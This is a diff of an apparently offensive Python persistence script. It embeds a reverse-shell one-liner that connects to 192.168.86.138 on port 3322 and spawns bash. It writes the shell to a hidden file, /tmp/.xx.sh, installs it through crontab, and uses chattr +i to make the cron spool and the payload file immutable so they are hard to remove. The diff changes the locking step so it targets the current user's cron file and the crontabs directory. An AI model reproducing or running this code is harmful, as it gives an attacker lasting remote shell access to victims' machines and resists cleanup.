@@ -62,9 +62,10 @@ if __name__ == '__main__':
     shell = """python""" + py + """ -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.86.138",3322));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"""
     file_path = "/tmp/.xx.sh"
     etc_crontab(shell, file_path)
-    ml('chmod + x ' + file_path)
+    user = ml('whoami').strip()
     try:
-        ml('chattr +i /var/spool/cron/')
+        ml('chattr +i /var/spool/cron/' + user)
+        ml('chattr +i /var/spool/cron/crontabs')
     except Exception as e:
         print('权限出现错误,/var/spool/cron/文件加锁失败')
     ml('chattr +i ' + file_path)
